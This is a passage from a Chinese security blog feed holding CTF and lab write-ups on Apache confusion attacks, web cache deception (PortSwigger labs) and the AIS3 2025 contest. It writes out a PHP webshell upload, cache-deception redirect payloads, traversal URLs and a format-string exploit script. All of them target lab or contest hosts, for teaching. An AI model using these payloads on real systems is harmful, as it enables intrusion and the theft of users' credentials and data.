bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">"&lt;?php echo system('env'); ?&gt;"</span> &gt; exploit.gif</code></pre></li><li>傳遞：上傳 Exploit 並得到上傳後的檔名為 <code>Meme-688656d968aa36.47347853.gif</code>。<br> <img src="/posts/2025-Apache-Confusion-Attacks/image6.webp" alt="alt"></li><li>攻擊：依據原始碼 <code>index.php</code>，檔案會被上傳到路徑 <code>/var/www/uploads/</code> 中。因此存取路徑 <code>http://localhost:1337/var/www/uploads/Meme-688656d968aa36.47347853.gif%3F.php</code> 得到 Flag。<br> <img src="/posts/2025-Apache-Confusion-Attacks/image7.webp" alt="alt"></li></ol><h3 id="二、專案"><a href="#二、專案" class="headerlink" title="二、專案"></a>二、專案</h3><p>隨著漏洞的公開，未來將有機會出現許多類似的 CTF 題型。因此我製作了檢測工具及 AI Prompt。請見：<a href="https://github.com/1PingSun/Apache-Confusion-Attacks-Detector">https://github.com/1PingSun/Apache-Confusion-Attacks-Detector</a>。</p><h2 id="肆、參考資料"><a href="#肆、參考資料" class="headerlink" title="肆、參考資料"></a>肆、參考資料</h2><ol><li>Black Hat（2025 年 1 月 30 日）。Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!。YouTube。<a href="https://youtu.be/euO9WbYHm0s">https://youtu.be/euO9WbYHm0s</a></li><li>Orange Tsai（2024 年 8 月 9 日）。Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!。Orange Tsai。<a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/">https://blog.orange.tw/posts/2024-08-confusion-attacks-en/</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Cyber </tag>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>網頁快取利用之技術分析</title>
      <link href="/2025/07/28/2025-WCD/"/>
      <url>/2025/07/28/2025-WCD/</url>
      
        <content type="html"><![CDATA[<h2 id="壹、摘要"><a href="#壹、摘要" class="headerlink" title="壹、摘要"></a>壹、摘要</h2><p>隨著 CDN 技術的普及，使網站的載入速度加快，並提供安全性的防護，但因其解析方式上的差異，也增加了攻擊者的攻擊面。本技術分析報告將針對 Martin Doyhenard 在 Black Hat 2024 的演講《Gotta Cache ‘em all: bending the rules of web cache exploitation》中提出的技術進行分析，並著重在 Web Cache Deception（網頁快取欺騙）。</p><h2 id="貳、分析動機"><a href="#貳、分析動機" class="headerlink" title="貳、分析動機"></a>貳、分析動機</h2><p>為了增加伺服器的隱蔽性同時降低伺服器的壓力，我通常習慣為自己的網站掛上 Cloudflare 的免費 CDN 服務。本以為 CDN 能夠提高安全性，沒想到竟然也帶來了新的攻擊面。</p><h2 id="參、背景知識"><a href="#參、背景知識" class="headerlink" title="參、背景知識"></a>參、背景知識</h2><h3 id="一、Web-Cache"><a href="#一、Web-Cache" class="headerlink" title="一、Web Cache"></a>一、Web Cache</h3><p>有些靜態資源需要重複請求，但由於其資源之更換頻率低，因此不需要每次都請求原始伺服器，此時就可以將資源暫存在快取伺服器中。當客戶端請求資源時，就可以直接存取快取伺服器而不需要向原始伺服器再次請求資源。</p><h3 id="二、CDN"><a href="#二、CDN" class="headerlink" title="二、CDN"></a>二、CDN</h3><p>CDN 全名 Content Delivery Network，是由分布在全球各地的伺服器節點組成，其主要目的是將資源暫存在距離使用者最近的伺服器以加快存取速度。同時因為其大量的節點，經常也會提供 DDoS 流量清洗、Web 防火牆（WAF）、SSL/TLS 加密等功能。</p><h3 id="三、Web-Cache-攻擊類型"><a href="#三、Web-Cache-攻擊類型" class="headerlink" title="三、Web Cache 攻擊類型"></a>三、Web Cache 攻擊類型</h3><ul><li><p>Web Cache Poisoning（網頁快取中毒）：攻擊者嘗試在快取中儲存惡意內容，當受害者嘗試存取網頁時，就會收到被污染的回應。</p></li><li><p>Web Cache Deception（網頁快取欺騙）：攻擊者透過一些技術，使受害者敏感資料被快取伺服器判定為靜態資源，從而將其儲存。接著，攻擊者再此存取相同資源即可取得受害者的敏感資料。</p></li></ul><h2 id="肆、URL-的解析方式"><a href="#肆、URL-的解析方式" class="headerlink" title="肆、URL 的解析方式"></a>肆、URL 的解析方式</h2><p>為了能夠讓快取儲存不應該被儲存的靜態資源，可以透過 URL 解析方式的差異加以利用。以下為一個簡單的範例：</p><ol><li>CDN 會儲存路徑 <code>/assets</code> 下面的資源的所有請求。但不會進行正規化處理，因此 <code>/assets/../admin</code> 也會被認定為 <code>/assets</code> 中的資源。</li><li>然而，原始伺服器收到請求後會進行正規化處理，回應 <code>/admin</code> 的資料。</li><li>因此攻擊者僅需使受害者存取 <code>/assets/../admin</code>，接著再快取移除前存取相同的路徑，就能夠取得受害者的 <code>/admin</code> 頁面並取得敏感資料。</li></ol><h3 id="一、分隔符號"><a href="#一、分隔符號" class="headerlink" title="一、分隔符號"></a>一、分隔符號</h3><p>為了達到 URL 解析不一致的目的，可以嘗試使用不同的分隔符號，觀察快取伺服器及原始伺服器如何解析。例如：快取伺服器可能預設不會對任何分隔符號進行截斷，但原始伺服器遇到分號 <code>;</code> 則會將其截斷，因此當請求 <code>/admin;style.css</code> 時，快取伺服器就會將管理者頁面的回應判斷成靜態資源 CSS 檔並將其儲存。</p><p>常見的分隔符號有：<code>;</code>、<code>#</code>、<code>?</code> 等。在進行測試時，可參考 PortSwigger 提供的<a href="https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list">分隔符號列表</a>。若使用 BurpSuite 的 Intruder，要記得將 URL 編碼取消勾選。</p><p><img src="/posts/2025-WCD/image.webp" alt="alt text"></p><h3 id="二、正規化"><a href="#二、正規化" class="headerlink" title="二、正規化"></a>二、正規化</h3><p>遇到 <code>../</code> 時，有些伺服器會回到父路徑，有些則不會，因此可透過正規化的差異進行網頁快取的利用。例如：在向不會進行正規化的快取伺服器請求 <code>/static/../admin</code> 時，快取伺服器會將其認定為靜態資源，然而原始伺服器會將其解析成 <code>/admin</code>，造成正規化的不一致。</p><p>以下是常見的 CDN 及原始伺服器對於 <code>/static/..%2fadmin</code> 請求的解析結果。</p><div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px;"><div><table><thead><tr><th>CDN提供商</th><th>解析結果</th></tr></thead><tbody><tr><td>CloudFlare</td><td><code>/static/..%2fadmin</code></td></tr><tr><td>CloudFront</td><td><code>/admin</code></td></tr><tr><td>GCP</td><td><code>/static/..%2fadmin</code></td></tr><tr><td>Azure</td><td><code>/admin</code></td></tr><tr><td>Imperva</td><td><code>/admin</code></td></tr><tr><td>Fastly</td><td><code>/static/..%2fadmin</code></td></tr></tbody></table></div><div><table><thead><tr><th>原始伺服器</th><th>解析結果</th></tr></thead><tbody><tr><td>Apache</td><td><code>/static/..%2fadmin</code></td></tr><tr><td>Nginx</td><td><code>/admin</code></td></tr><tr><td>IIS</td><td><code>/admin</code></td></tr><tr><td>Gunicore</td><td><code>/static/..%2fadmin</code></td></tr><tr><td>OpenLite</td><td><code>/admin</code></td></tr><tr><td>Puma</td><td><code>/static/..%2fadmin</code></td></tr></tbody></table></div></div><h2 id="伍、漏洞利用"><a href="#伍、漏洞利用" class="headerlink" title="伍、漏洞利用"></a>伍、漏洞利用</h2><h3 id="一、靜態副檔名"><a href="#一、靜態副檔名" class="headerlink" title="一、靜態副檔名"></a>一、靜態副檔名</h3><p>有許多 CDN 提供商或快取伺服器都會儲存具有靜態副檔名的資源，如果請求路徑的結尾為 <code>.js</code> 或 <code>.css</code> 等，就會被視為靜態資源儲存。以下提供一個範例：</p><ul><li>瀏覽器請求資源 <code>/admim%23a.css</code></li><li>快取伺服器偵測到結尾為 <code>.css</code> 因此將其判定為靜態資源</li><li>原始伺服器將 <code>%23</code> 解析為 <code>#</code>，回應資源 <code>/admin</code></li><li>攻擊者可誘使受害者存取 <code>/admin%23a.css</code>，隨後立即存取 <code>/admin</code>，就能夠取得受害者的 <code>/admin</code> 頁面。</li></ul><p><strong>INFO</strong></p><p>關於 Cloudflare CDN 預設的靜態副檔名請見官方文件：<a href="https://developers.cloudflare.com/cache/concepts/default-cache-behavior/#default-cached-file-extensions">https://developers.cloudflare.com/cache/concepts/default-cache-behavior/#default-cached-file-extensions</a></p><h3 id="二、靜態資源"><a href="#二、靜態資源" class="headerlink" title="二、靜態資源"></a>二、靜態資源</h3><p>一些常見的路徑下通常只會儲存靜態資源，此時也可透過這點搭配分隔符號或正規化的差異進行利用。常見的靜態目錄包含：</p><ul><li><code>/static</code></li><li><code>/assets</code></li><li><code>/wp-content</code></li><li><code>/media</code></li><li><code>/templates</code></li></ul><p>除了靜態目錄外，也有一些特定的檔案不在上述的靜態目錄中，但其變更的次數並不頻繁。包含：<code>robots.txt</code> 及 <code>favicon.ico</code> 等。</p><h2 id="陸、防護方式"><a href="#陸、防護方式" class="headerlink" title="陸、防護方式"></a>陸、防護方式</h2><p>身為一個網站開發者，可以透過以下常見方式避免網頁快取欺騙攻擊：</p><ol><li>將 Cache Header 設定為 <code>no-store</code>、<code>private</code>。</li><li>確保 CDN 和原始伺服器的快取規則相同。</li></ol><h2 id="柒、深入學習"><a href="#柒、深入學習" class="headerlink" title="柒、深入學習"></a>柒、深入學習</h2><h3 id="一、PortSwigger-Academy-Lab"><a href="#一、PortSwigger-Academy-Lab" class="headerlink" title="一、PortSwigger Academy Lab"></a>一、PortSwigger Academy Lab</h3><p><img src="/posts/2025-WCD/image2.webp" alt="alt"></p><p>為了能夠深入了解漏洞之原理及利用方式，我嘗試完成 PortSwigger Academy 中 Web cache deception 主題的所有 Lab 並撰寫 Writeup。Writeup 如下：</p><p><strong>Lab: <a href="https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping">Exploiting path mapping for web cache deception</a></strong></p><ol><li>偵查目標<ol><li>使用帳號 <code>wiener</code>、密碼 <code>peter</code> 登入。</li><li>發現回應包含 API key</li></ol></li><li>辨識路徑解析不一致<ol><li>發送 <code>/my-account/abc</code> 路徑的請求，發現回應資料仍然包含你的 API Key，表示原始伺服器將其解析成 <code>/my-account</code>。</li><li>在 URL 路徑加上副檔名，例如：<code>/my-account/abc.js</code>，接著發送請求。發現回應包含 <code>X-Cache: miss</code>（表示回應不是從快取提供）和 <code>Cache-Control: max-age=30</code>（表示會被儲存 30 秒）表頭。</li><li>在 30 秒內重新傳送請求，發現表頭 <code>X-Cache</code> 的數字變成 <code>hit</code>，表示回應資料來自快取。由此可以推斷快取解釋 URL 路徑為 <code>/my-account/abc.js</code> 並符合 <code>.js</code> 副檔名的快取規則。所以可以使用這個 payload 進行利用。</li></ol></li><li>進行漏洞利用<ol><li>在網站中點擊 <strong>Go to exploit server</strong></li><li>在 <strong>Body</strong> 部分讓受害者（<code>carlos</code>）跳轉到你製作的惡意 URL。需注意應修改路徑後方的參數，以避免受害者存取到你之前存取的快取回應。<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">"https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></li><li>點擊 <strong>Deliver exploit to victim</strong>。當受害者存取該 URL，回應會儲存在快取。</li><li>前往提供給受害者（<code>carlos</code>）存取的路徑（<code>https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js</code>），就可以看到 <code>carlos</code> 的 API Key 了。</li></ol></li></ol><p><strong>Lab: <a href="https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-delimiters">Exploiting path delimiters for web cache deception</a></strong></p><ol><li>偵查：使用 Burp Intruder 嘗試不同分隔字元，判斷原始伺服器會解析哪些分隔符號<ol><li>將請求傳送到 Intruder</li><li>加上參數<br>  <img src="https://i.imgur.com/5fC2ACc.png"></li><li>將 <a href="https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list">Web cache deception lab delimiter list</a> 中的字元貼上到 payload 的地方</li><li>取消勾選 URL-encode these characters 選項</li><li>點擊 Start attack 完成攻擊後，會發現只有字元 <code>?</code> 和 <code>;</code> 回應 200，其他都是 404</li></ol></li><li>偵查：判斷是否會被快取儲存<ol><li>使用 <code>?</code> 字元作為分隔符號會發現 header 沒有快取的痕跡<br><img src="https://i.imgur.com/ODpYO8i.jpeg"></li><li>使用 <code>;</code> 字元作為分隔符號連續請求兩次，發現 header 有被快取儲存的跡象<br><img src="https://i.imgur.com/eMDME6l.jpeg"><br><img src="https://i.imgur.com/GPkMfy8.jpeg"></li></ol></li><li>漏洞利用<ol><li>在 Go to exploit server 的 body 撰寫 payload<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">"https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js"</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></li><li>接著前往路徑 <code>https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js</code> 就可以拿到受害者的 API key 了！</li></ol></li></ol><p><strong>Lab: <a href="https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization">Exploiting origin server normalization for web cache deception</a></strong></p><ol><li>偵查原始伺服器標準化<ol><li>前往路徑 <code>/my-account</code>，會回傳個人資料頁面並顯示 API Key</li><li>前往路徑 <code>/aaa/..%2fmy-account</code> 仍成功回傳個人資料頁面並顯示 API Key，且路徑列顯示 <code>/aaa/..%2fmy-account</code>，表示原始伺服器會解析 <code>%2f</code>。</li></ol></li><li>偵查快取伺服器標準化<ol><li>尋找一個正確的靜態資源並確保其有被快取，這裡選擇：<code>/resources/labheader/js/labHeader.js</code></li><li>前往路徑 <code>/aaa/..%2fresources/labheader/js/labHeader.js</code> 發現快取並不會將其儲存</li><li>判斷快取伺服器不會解析 <code>%2f</code> 且快取規則包含開頭為靜態資源路徑之規則</li></ol></li><li>利用<ol><li>製作 Payload：<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">"https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account"</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></li><li>將其傳送給受害者後攻擊者再次前往路徑 <code>https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account</code> 即可得到受害者的 API Key</li></ol></li></ol><p><strong>Lab: <a href="https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization">Exploiting cache server normalization for web cache deception</a></strong></p><ol><li>偵查原始伺服器解析的路徑分隔符號<ol><li>使用 <strong>Intruder</strong> 發送請求</li><li>Payload 使用 <code>/my-account§§abc</code></li><li>分隔符號參數可參考 <a href="https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list">Web cache deception lab delimiter list</a></li><li>發現 <code>#</code>、<code>?</code>、<code>%23</code>、<code>%3f</code> 回應狀態碼 <code>200</code>。但 <code>#</code> 不可使用，因為會在請求前就被瀏覽器當作分隔符號。</li></ol></li><li>偵查標準化不一致<ol><li>對路徑 <code>/aaa/..%2fmy-account</code> 請求，回應狀態碼 <code>404</code>，表示原始伺服器不會解析 <code>..%2f</code></li><li>使用 Payload <code>/aaa/..%2fresources/YOUR-RESOURCE</code> 發現會被快取，表示快取會解析 <code>..%2f</code> 且快取規則匹配開頭為 <code>/resources</code> 的請求</li></ol></li><li>漏洞利用<ol><li>使用 Payload：<code>/my-account%23%2f%2e%2e%2fresources?wcd</code><ul><li>原始伺服器將會解析分隔符號 <code>%23</code>，並將路徑解析為 <code>/my-account</code> 回應 API Key</li><li>快取伺服器會解析 <code>..%2f</code>，所以將路徑解析為 <code>/resources</code> 並將回應儲存在快取</li></ul></li><li>製作 Payload 並發送給受害者，接著攻擊者再次存取即可獲得受害者的 API Key<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">"https://0a2800ef0485f50b8033ad7a00b0005f.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd"</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></li></ol></li></ol><p><strong>Lab: <a href="https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-exact-match-cache-rules">Exploiting exact-match cache rules for web cache deception</a></strong></p><ol><li>偵查快取伺服器檔案名稱快取規則<ol><li>前往路徑 <code>/robots.txt</code> 發現會被快取</li></ol></li><li>偵查分隔符號不一致<ol><li>前往路徑 <code>/robots.txt;aaa</code> 發現會回應 <code>robots.txt</code> 的內容，但不會被快取，表示快取伺服器不會解析 <code>;</code>，但原始伺服器會解析。</li></ol></li><li>嘗試漏洞利用<ol><li>前往 <code>https://0ae5006803083ae3a2794be300d00087.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt</code></li><li>發現回應個人資料頁面，但不會被快取，表示：<ul><li>原始伺服器將 <code>;</code> 解析為分隔符號</li><li>快取伺服器不會解析 <code>;</code></li><li>快取伺服器會解析路徑遍歷部分 <code>%2f%2e%2e%2</code>，並將此請求解析為 <code>/robots.txt</code></li></ul></li><li>發送 Payload 給受害者：<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">"https://0ae5006803083ae3a2794be300d00087.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt?wcd"</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></li><li>使用 <strong>Repeater</strong> 將原本的 <code>/my-account</code> 請求修改成路徑 <code>/my-account;%2f%2e%2e%2frobots.txt?wcd</code> 並發送請求</li><li>將回應被快取的 administrator 使用者個人資料頁面，並在當中找到 csrf 值</li></ol></li></ol><h3 id="二、CTF-出題"><a href="#二、CTF-出題" class="headerlink" title="二、CTF 出題"></a>二、CTF 出題</h3><p>在完成 PortSwigger Academy Lab 的過程中，我發現關於 Web Cache Deception 的 CTF 題目均圍繞著快取伺服器和原始伺服器的解析方式差異。因此我想嘗試寫一個能夠自定義解析規則的快取伺服器，讓出題者能夠快速的設計 CTF 題目。但由於時間關係，目前只完成初步的計畫，後續更新請見 GitHub 專案：<a href="https://github.com/1PingSun/Custom-Cache-Server-for-WCD">https://github.com/1PingSun/Custom-Cache-Server-for-WCD</a>。</p><h2 id="捌、參考資料"><a href="#捌、參考資料" class="headerlink" title="捌、參考資料"></a>捌、參考資料</h2><ol><li>Black Hat（2025 年 2 月 8 日）。Gotta Cache Em All: Bending the Rules of Web Cache Exploitation。YouTube。<a href="https://youtu.be/9gvxEhugnVM">https://youtu.be/9gvxEhugnVM</a></li><li>1PingSun（無日期）。網頁快取詐欺（Web Cache Deception）。PortSwigger Academy 翻譯。2025 年 7 月 27 日，取自 <a href="https://web-security.1ping.org/Server-side/Web_Cache_Deception.html">https://web-security.1ping.org/Server-side/Web_Cache_Deception.html</a></li><li>PortSwigger（無日期）。Web cache deception。PortSwigger Web Security Academy。2025 年 7 月 27 日，取自 <a href="https://portswigger.net/web-security/web-cache-deception">https://portswigger.net/web-security/web-cache-deception</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Cyber </tag>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025 AIS3 Pre-Exam &amp; MyFirstCTF 心得 / Writeup</title>
      <link href="/2025/07/02/2025-AIS3-PreExam-MyFirstCTF-Writeup/"/>
      <url>/2025/07/02/2025-AIS3-PreExam-MyFirstCTF-Writeup/</url>
      
        <content type="html"><![CDATA[<p>如比賽名稱，今年是我第一次參加 MyFirstCTF，大概也是最後一次參加，畢竟參加條件相當嚴格。</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image.webp" alt="MyFirstCTF 參加資格"></p><p>今年 MyFirstCTF 辦在國立陽明交通大學新竹光復校區，為了避免遲到，我搭上一大早的高鐵，然後就不小心太早到了，比賽現場沒有任何參賽者。</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image2.webp" alt="一大早搭乘 7:00 的高鐵前往新竹"></p><p>相信比起競賽本身，大家更在意伙食。在競賽場地（教室）後方擺滿一整排的零食、飲料，並且會隨時補充，中午則是吃披薩，但要早點去拿不然會被拿光。</p><p>回到競賽本身，這個比賽名為「MyFirstCTF」，所以題目也不會到太難（吧），於是我決定體驗一把從未嘗試過的藏 Flag，在最後 30 分鐘的時候將 Flag 一次提交衝到第一名，交完所有 Flag 後超級擔心被第二、三名超過，好險最後有維持著成績並以排名第一的名次拿到金質獎，今年的獎品是 AIS3 的衣服超級讚的（發瘋rr）。</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image3.webp" alt="獎品與獎狀"></p><p>因為在打拉麵 OSINT 題的時候，我跑去問黃俊穎教授可不可以直接打電話給拉麵店，競賽結束後跑去和教授搭話，教授就說：「你打完電話就一柱擎天了喔」。用奇怪的記憶點被教授記住好像也不錯（欸），希望教授有記得我～</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image4.webp" alt="一柱擎天的 Scoreboard"></p><p>雖然一柱擎天有點欠揍，但還是…</p><blockquote><p>勝不驕，敗不餒</p></blockquote><p>名次只是結果，其實一點也不重要，重要的過程中的學習和成長。贏了比賽，就要往更高的目標邁進，畢竟這只是 MyFirstCTF，大家都是第一次打 CTF（才有鬼 XD）；沒有得名也不用氣餒，明年 Pre-Exam 繼續拼！</p><hr><p>後面就是這次 Pre-Exam 和 MyFirstCTF 的 Writeup 啦～</p><p>先偷偷說，這次有三題的 Exploit 是直接叫 AI 生成的 🤫，去年我甚至全部 Pre-Exam 只有解開三題，今年光是 AI 就幫我解開三題了，不得不感嘆 AI 的成長速度啊～</p><p>雖然有部分題目是透過 AI 幫我解開的，但這是我第一次在正式的比賽中把每個主題（Web, Rev, Pwn, etc.）都至少解開一題，往回看會發現自己進步了不少，超級有成就感。</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Tomorin-db-🐧"><a href="#Tomorin-db-🐧" class="headerlink" title="Tomorin db 🐧"></a>Tomorin db 🐧</h3><h4 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h4><blockquote><p>I make a simple server which store some Tomorin.</p><p>Tomorin is cute ~</p><p>I also store flag in this file server, too.</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image5.gif" alt="50c9d30cd5623ae1a9154f58e7769b0e"></p><p><a href="http://chals1.ais3.org:30000/">http://chals1.ais3.org:30000</a></p><p>Author: naup96321</p></blockquote><h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h4><p>打開題目原始碼看 <code>main.go</code>，發現若像 /flag 請求，會被導向到 YouTube 影片連結。</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">"net/http"</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {http.Handle(<span class="hljs-string">"/"</span>, http.FileServer(http.Dir(<span class="hljs-string">"/app/Tomorin"</span>)))http.HandleFunc(<span class="hljs-string">"/flag"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {http.Redirect(w, r, <span class="hljs-string">"https://youtu.be/lQuWN0biOBU?si=SijTXQCn9V3j4Rl6"</span>, http.StatusFound)  })  http.ListenAndServe(<span class="hljs-string">":30000"</span>, <span class="hljs-literal">nil</span>)}</code></pre><p>嘗試路徑遍歷，就拿到 Flag 了。</p><pre><code class="hljs plaintext">http://chals1.ais3.org:30000/..%2fflag</code></pre><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image6.webp" alt="Screenshot 2025-06-03 at 18.30.13"></p><p>Flag：<code>AIS3{G01ang_H2v3_a_c0O1_way!!!_Us3ing_C0NN3ct_M3Th07_L0l@T0m0r1n_1s_cute_D0_yo7_L0ve_t0MoRIN?}</code></p><h3 id="Login-Screen-1"><a href="#Login-Screen-1" class="headerlink" title="Login Screen 1"></a>Login Screen 1</h3><h4 id="題目-1"><a href="#題目-1" class="headerlink" title="題目"></a>題目</h4><blockquote><p>Welcome to my Login Screen! This is your go-to space for important announcements, upcoming events, helpful resources, and community updates. Whether you’re looking for deadlines, meeting times, or opportunities to get involved, you’ll find all the essential information posted here. Be sure to check back regularly to stay informed and connected!</p><p><a href="http://login-screen.ctftime.uk:36368/">http://login-screen.ctftime.uk:36368/</a></p><p>Note: The flag starts with AIS3{1.</p><p>Author: Ching367436</p></blockquote><h4 id="Writeup-1"><a href="#Writeup-1" class="headerlink" title="Writeup"></a>Writeup</h4><p>題目連結打開後是一個登入介面，依照下方說明輸入帳號密碼 guest/guest 登入。</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image7.webp" alt="Screenshot 2025-06-03 at 18.32.48"></p><p>網頁要求輸入 2FA Code，依照下方說明輸入 <code>000000</code>，成功以 guest 使用者登入。</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image8.webp" alt="Screenshot 2025-06-03 at 18.33.18"></p><p>發現需要以 admin 使用者才能拿到 Flag。</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image9.webp" alt="Screenshot 2025-06-03 at 18.37.53"></p><p>查看題目原始碼目錄結構。</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image10.webp" alt="Screenshot 2025-06-03 at 18.51.09"></p><p>直接請求 <code>/users.db</code> 下載資料庫取得 admin 的帳號、雜湊後的密碼以及 2FA 驗證碼。</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image11.webp" alt="Screenshot 2025-06-03 at 23.40.21"></p><p>密碼的部分直接暴力猜是 <code>admin</code> 然後就中了，連 hydra 都不用開。</p><p>登入後就拿到 Flag 了。</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image12.webp" alt="Screenshot 2025-06-03 at 23.44.41"></p><p>Flag：<code>AIS3{1.Es55y_SQL_1nJ3ct10n_w1th_2fa_IuABDADGeP0}</code></p><p>後記：其實題目一開始沒有放原始碼，我是用 dirsearch 爆出資料庫路徑的。</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Format-Number"><a href="#Format-Number" class="headerlink" title="Format Number"></a>Format Number</h3><h4 id="題目-2"><a href="#題目-2" class="headerlink" title="題目"></a>題目</h4><blockquote><p>Print the number in the format you like !</p><p>nc chals1.ais3.org 50960</p><p>Author : Curious</p></blockquote><h4 id="Writeup-2"><a href="#Writeup-2" class="headerlink" title="Writeup"></a>Writeup</h4><p>直接上 exploit：</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'critical'</span>host = <span class="hljs-string">"chals1.ais3.org"</span>port = <span class="hljs-number">50960</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_stack</span>(<span class="hljs-params">offset</span>):    p = remote(host, port)    p.recvuntil(<span class="hljs-string">b'What format do you want ? '</span>)        payload = <span class="hljs-string">f""</span>.encode() + <span class="hljs-string">b'\x5c'</span> + <span class="hljs-string">f'%<span class="hljs-subst">{offset}</span>$'</span>.encode()    p.send(payload)    p.recvuntil(<span class="hljs-string">b"Format number : "</span>)    result = p.recvline().strip().replace(<span class="hljs-string">b'%'</span>, <span class="hljs-string">b''</span>).replace(<span class="hljs-string">b'\\'</span>, <span class="hljs-string">b''</span>).replace(<span class="hljs-string">b'$d'</span>, <span class="hljs-string">b''</span>).decode()    p.close()    <span class="hljs-keyword">return</span> resultdata = []<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):    response = <span class="hljs-built_in">int</span>(leak_stack(i))    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\rRunning: <span class="hljs-subst">{i}</span>/100"</span>, end=<span class="hljs-string">''</span>)    <span class="hljs-keyword">if</span> response &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> response &lt; <span class="hljs-number">256</span>:        data.append(response)<span class="hljs-built_in">print</span>(<span class="hljs-string">"\nThe result is: "</span>, end=<span class="hljs-string">''</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i), end=<span class="hljs-string">''</span>)</code></pre><p>Flag：<code>AIS3{S1d3_ch@nn3l_0n_fOrM47_strln&amp;_!!!}</code></p><h3 id="Welcome-to-the-World-of-Ave-Mujica🌙"><a href="#Welcome-to-the-World-of-Ave-Mujica🌙" class="headerlink" title="Welcome to the World of Ave Mujica🌙"></a>Welcome to the World of Ave Mujica🌙</h3><h4 id="題目-3"><a href="#題目-3" class="headerlink" title="題目"></a>題目</h4><blockquote><p>就將一切委身於 Ave Mujica 吧…</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image13.webp" alt="3893df60d1aa4e921d82b837e5aab9c2"></p><p>Flag 在 /flag，這題的 flag 有 Unicode 字元，請找到 flag 之後直接提交到平台上，如果因為一些玄學問題 